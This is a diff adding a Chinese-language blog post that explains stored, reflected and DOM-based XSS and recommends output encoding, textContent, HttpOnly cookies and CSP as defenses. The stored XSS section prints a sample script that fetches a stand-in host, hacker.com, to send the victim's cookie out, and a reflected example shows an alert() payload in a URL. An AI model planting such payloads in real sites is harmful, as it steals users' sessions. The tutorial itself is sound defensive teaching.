@@ -1,0 +1,55 @@
+---
+title: "Cross-site Scripting (XSS)"
+date: "2026-01-09"
+description: "Cross-site Scripting"
+tags: ["cross-site-scripting"]
+cover: "/og/cross-site-scripting.png"
+category: "Security"
+---
+
+****  
+### 儲存型XSS (Stored XSS):
+惡意腳本會被永久儲存在目標伺服器的資料庫中（例如：留言板、評論區、使用者個人資料）。
+- 攻擊路徑：黑客在留言框輸入 
+```HTML
+<script>fetch('https://hacker.com/steal?cookie=' + document.cookie)</script>
+```
+- 結果：每當有其他使用者（包括管理員）打開這則留言，瀏覽器就會自動執行這段代碼，將他們的 Cookie 傳給黑客。
+
+### 反射型XSS (Reflected XSS):
+惡意腳本不會存在資料庫，而是透過 URL 參數「反射」回來。
+- 攻擊路徑：黑客構造一個連結：
+```URL
+https://bank.com/search?q=<script>alert('Hacked')</script>
+```
+- 手法：透過電子郵件或社群媒體誘騙使用者點擊該連結。
+- 結果：網站的搜尋頁面可能會顯示「您搜尋的是：`<script>...</script>`」，導致腳本在該使用者的瀏覽器執行。
+
+### DOM型XSS (DOM-based XSS):
+這種攻擊完全發生在前端（客戶端），伺服器完全不知情。它是因為 JavaScript 程式碼不安全地處理了 URL 中的數據。
+- 原理：腳本透過 **window.location** 讀取 URL 內容，並使用 **innerHTML** 或 **document.write** 直接渲染到網頁。
+- 特性：惡意代碼可能隱藏在 URL 的雜湊值（#）後面，伺服器不會收到這部分內容，因此後端防火牆（WAF）難以偵測。
+
+****
+### XSS 攻擊能做什麼？
+一旦腳本執行，黑客就擁有了該使用者在該網站的「所有權限」：
+
+- 盜取 Session/Cookie：直接登入使用者的帳號。
+- 劫持表單：使用者輸入信用卡號或密碼時，偷偷傳一份給黑客。
+- 強迫跳轉：將使用者引導至釣魚網站。
+- 修改內容：在頁面顯示假的轉帳資訊或詐騙訊息。
+
+****
+### 如何防範 XSS？
+防範 XSS 的核心在於：不要讓瀏覽器把「資料」當作「程式碼」執行。
+
+| 防禦手段 | 說明 |
+| --- | --- |
+| 輸出轉義 (Output Encoding) | 將 < 轉為 &lt;，> 轉為 &gt;。這是最基本的防禦。 |
+| 使用安全屬性 | 在 JS 中優先使用 .textContent 而非 .innerHTML，前者會把輸入當純文字處理。 |
+| HttpOnly Cookie | 在設定 Cookie 時加上 HttpOnly 標記，這樣 JS 就無法透過 document.cookie 讀取它。 |
+| 內容安全策略 (CSP) | 透過 HTTP Header 設定 Content-Security-Policy，限制瀏覽器只能執行來自受信任來源的腳本。 |
+
+****
+### Reference:
+- [Content Security Policy](/blog/content-security-policy)
